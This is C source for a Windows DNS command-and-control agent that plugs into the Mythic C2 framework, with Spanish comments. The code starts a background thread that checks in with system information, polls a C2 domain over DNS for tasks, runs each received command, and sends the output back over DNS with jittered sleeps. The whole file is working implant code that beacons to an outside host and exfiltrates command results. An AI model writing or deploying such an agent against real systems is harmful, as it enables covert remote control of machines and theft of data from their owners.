// mythic.c - Mythic integration for DNS C2 Agent

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "../include/Config.h"
#include "../include/Utils.h"
#include "../include/mythic.h"
#include "../include/Transport.h"
#include "../include/Parser.h"
#include "../include/Command.h"

// Estado del servicio
static volatile LONG service_running = FALSE;
static HANDLE       service_thread  = NULL;

// Marca para no registrar callback más de una vez
static BOOL callback_registered = FALSE;

// Prototipo interno para procesar un comando
static void process_command(const char* domain);

// ******************************************************
// * Implementación de la API Mythic
// ******************************************************

// mythic_init: por ahora no hace nada especial
BOOL mythic_init() {
    return TRUE;
}

// mythic_cleanup: no hay recursos propios
void mythic_cleanup() {}

// Crea el JSON de check-in (usamos get_system_info())
char* mythic_create_checkin_message(const MythicCheckin* checkin, size_t* message_len) {
    (void)checkin;
    char* json = get_system_info();
    if (!json) return NULL;
    *message_len = strlen(json);
    return json;
}

// Parsea un JSON de tasking a MythicTask
BOOL mythic_parse_tasking_message(const char* message, size_t message_len, MythicTask* task) {
    // Debes implementar o enlazar parse_tasking_json(),
    // que rellena 'task' a partir de 'message' JSON.
    return parse_tasking_json(message, message_len, task);
}

// Crea el JSON de respuesta a un tasking
char* mythic_create_response_message(const char* task_id, const char* output, size_t* message_len) {
    size_t needed = strlen(task_id) + strlen(output) + 32;
    char* json = malloc(needed);
    if (!json) return NULL;
    int n = _snprintf_s(json, needed, _TRUNCATE,
                        "{\"task_id\":\"%s\",\"output\":\"%s\"}",
                        task_id, output);
    *message_len = (n > 0 ? (size_t)n : 0);
    return json;
}

// Devuelve el UUID interno
const char* mythic_get_uuid() {
    return get_agent_uuid();
}

// Permite inyectar un UUID de prueba
void mythic_set_uuid(const char* uuid) {
    // Si deseas soportar override, implementa set_agent_uuid()
    (void)uuid;
}

// Imprime por stdout el JSON de check-in para registrar callback
void register_callback(const char* checkin_json) {
    printf("%s\n", checkin_json);
    fflush(stdout);
}

// ******************************************************
// * Lógica de servicio en background (opcional)
// ******************************************************

// Hilo principal: registra callback, hace check-in y luego polling
static DWORD WINAPI service_loop(LPVOID lpParam) {
    const char* domain = (const char*)lpParam;

    while (InterlockedCompareExchange(&service_running, 1, 1)) {
        // Registrar callback sólo la primera vez
        if (!callback_registered) {
            char* info_json = get_system_info();
            if (info_json) {
                register_callback(info_json);
                free(info_json);
            }
            callback_registered = TRUE;
        }

        // Check-in
        if (!transport_perform_checkin()) {
            Sleep(1000);
            continue;
        }

        // Procesar tasking
        process_command(domain);

        // Esperar con jitter
        DWORD base  = get_sleep_interval();
        DWORD delay = apply_jitter(base, get_jitter_percentage());
        Sleep(base + delay);
    }
    return 0;
}

// Inicia el servicio en background
BOOL start_mythic_service() {
    if (InterlockedCompareExchange(&service_running, 1, 0) == 1) {
        return FALSE; // Ya corriendo
    }
    const char* domain = get_c2_domain();
    if (!domain) {
        InterlockedExchange(&service_running, 0);
        return FALSE;
    }
    if (!dns_transport_init()) {
        InterlockedExchange(&service_running, 0);
        return FALSE;
    }
    service_thread = CreateThread(NULL, 0, service_loop, (LPVOID)domain, 0, NULL);
    if (!service_thread) {
        InterlockedExchange(&service_running, 0);
        return FALSE;
    }
    return TRUE;
}

// Detiene el servicio
void stop_mythic_service() {
    if (!InterlockedCompareExchange(&service_running, 0, 1)) {
        return; // No estaba corriendo
    }
    WaitForSingleObject(service_thread, INFINITE);
    CloseHandle(service_thread);
}

// Procesa un único comando recibido
static void process_command(const char* domain) {
    char* raw = dns_request_command(get_agent_uuid(), domain);
    if (!raw) return;
    if (*raw == '\0') { free(raw); return; }

    MythicTask task;
    if (!mythic_parse_tasking_message(raw, strlen(raw), &task)) {
        free(raw);
        return;
    }
    free(raw);

    char* result = NULL;
    BOOL ok = execute_command(task.command, &result);
    if (!ok || !result) {
        if (result) free(result);
        return;
    }

    // Empaquetar JSON de respuesta y enviarlo
    size_t resp_len;
    char*  resp_json = mythic_create_response_message(task.id, result, &resp_len);
    free(result);
    if (resp_json) {
        dns_send_result(get_agent_uuid(), task.id, resp_json, domain);
        free(resp_json);
    }
}
